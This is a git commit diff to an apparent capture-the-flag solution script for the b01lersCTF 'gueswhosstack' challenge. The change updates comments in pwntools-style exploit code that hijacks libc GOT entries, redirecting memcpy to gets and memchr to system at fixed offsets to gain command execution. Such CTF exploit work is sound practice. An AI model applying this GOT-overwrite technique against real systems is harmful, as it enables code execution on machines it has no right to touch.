a11fdc4f85840f20ad2fc7ccb416952b05af65fd
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-04-21 17:01:12 -0400

    Update b01lersCTF

--- b01lersCTF/gueswhosstack/gueswhosstack.py
+++ b01lersCTF/gueswhosstack/gueswhosstack.py
@@ -21,10 +21,10 @@ log.info(f'glibc base address: {hex(glibc_base_addr)}')
 
 # Libc GOT hijacking
 glibc_e = ELF('./libc.so.6')
-# Overwrite GOT entry of memcpy (__memmove_evex_unaligned_erms is called by printf) with gets
+# Overwrite GOT entry of memcpy (printf->__vfprintf_internal->__printf_buffer->__printf_buffer_write->__memmove_evex_unaligned_erms) with gets
 p.recvuntil(b'He opens his mouth but the words don\'t come out... ')
 p.sendline(f'{glibc_base_addr+0x1fe150} {glibc_base_addr+glibc_e.symbols['gets']}'.encode())
-# Overwrite GOT entry of memchr (__memchr_evex is called by gets) with system
+# Overwrite GOT entry of memchr (_IO_gets->_IO_getline->_IO_getline_info->__memchr_evex) with system
 p.recvuntil(b'\nHe\'s chokin how, everbody\'s jokin now... ')
 p.send(f'{glibc_base_addr+0x1fe040} {glibc_base_addr+glibc_e.symbols['system']}'.encode())
 # Input for gets as argument for system
